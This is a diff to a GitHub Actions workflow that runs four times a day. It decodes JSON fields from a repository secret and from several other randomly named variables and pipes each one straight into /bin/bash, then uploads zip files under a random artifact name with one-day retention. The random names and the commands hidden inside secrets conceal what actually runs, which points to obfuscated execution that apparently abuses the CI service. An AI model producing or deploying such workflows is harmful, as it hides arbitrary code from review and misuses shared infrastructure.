@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '15 3,9,15,21 * * *'
+    - cron: '12 0,6,12,18 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -14,14 +14,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          xw508: ${{ secrets.xw508 }}
+          up925: ${{ secrets.up925 }}
         run: |
-          printf '%s' "$xw508" | jq -r .jxztw61 | /bin/bash
-          echo $asql9753 | jq -r .zk7913 | /bin/bash
+          printf '%s' "$up925" | jq -r .nlu518 | /bin/bash
+          echo $x31 | jq -r .e83 | /bin/bash
+          printf '%s' "$s9" | jq -r .ohx51180 | /bin/bash
+          echo $fri1217 | jq -r .ksn6714 | /bin/bash
+          echo $jll059 | jq -r .m4 | /bin/bash
+          echo $dctoz545 | jq -r .skx73759 | /bin/bash
+          printf '%s' "$v86" | jq -r .spwh0 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: gnzLGjpk
+          name: nFrllmVW
           path: "*.zip"
           retention-days: 1
